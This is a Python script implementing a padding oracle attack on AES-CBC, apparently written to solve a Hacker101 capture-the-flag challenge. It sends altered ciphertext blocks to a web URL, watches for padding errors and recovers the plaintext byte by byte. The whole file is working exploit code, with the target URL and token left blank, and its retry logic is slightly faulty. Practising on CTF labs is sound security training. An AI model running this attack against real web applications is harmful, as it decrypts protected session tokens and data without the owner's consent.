import base64
import requests
from requests.exceptions import Timeout
import time

base_url = ""
data = ""
block_size = 16  #AES block size is fixed to 16 bytes. Other CBC algorithms will differ. h101 was so kind to tell us they were using AES <3


def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def decrypt_block(previous_block, current_block, block_size, base_url):
    intermediate_state = bytearray(block_size)
    decrypted_block = bytearray(block_size)

    for byte_index in reversed(range(block_size)):
        padding_value = block_size - byte_index

        for guess in range(256):
            modified_block = bytearray(previous_block)

            for i in range(1, padding_value + 1):
                modified_block[-i] = xor_bytes(intermediate_state[-i:], bytes([padding_value] * i))[0]

            modified_block[byte_index] = modified_block[byte_index] ^ guess
            modified_data = base64.urlsafe_b64encode(modified_block + current_block).decode('utf-8')
            modified_data = modified_data.replace('=', '~').replace('/', '!').replace('+', '-')

            print("Trying guess:", guess)
            attempt = 1
            backoff = 1 
            decrypt_success = False
            while attempt in range(5):
                try: 
                    url = f"{base_url}{modified_data}"
                    response = requests.get(url, timeout=10) # 10 secs

                    if response.status_code == 200 and "padding" not in response.text.lower():
                        intermediate_state[byte_index] = guess ^ padding_value
                        decrypted_block[byte_index] = previous_block[byte_index] ^ intermediate_state[byte_index]
                        decrypt_success = True
                        break
                except Timeout:
                    print(f"Request timed out at attempt {attempt}. retrying in {backoff} second(s)")
                    time.sleep(attempt ** 2) # exp backup
                attempt += 1
            if not decrypt_success and attempt > 5: 
                print("Failed to decrypt byte due to network timeout. Check that the hacker 101 instance is still available. Exiting")
                break
                    
    return decrypted_block

def decrypt_data(encrypted_data, block_size, base_url):
    iv = encrypted_data[:block_size]
    blocks = [encrypted_data[i:i+block_size] for i in range(block_size, len(encrypted_data), block_size)]
    decrypted_message = bytearray()
    previous_block = iv
    for block in blocks:
        print (f"decypting block : {blocks.index(block)}")
        decrypted_block = decrypt_block(previous_block, block, block_size, base_url)
    
        decrypted_message.extend(decrypted_block)
        previous_block = block

        remaining_blocks = len(blocks) - blocks.index(block) - 1
        print("Remaining blocks:", remaining_blocks)
    return decrypted_message




adjusted_data = data.replace('~', '=').replace('!', '/').replace('-', '+')
binary_data = base64.urlsafe_b64decode(adjusted_data)


decrypted_message = decrypt_data(binary_data, block_size, base_url)
print("Decrypted message:", decrypted_message.decode(errors='ignore'))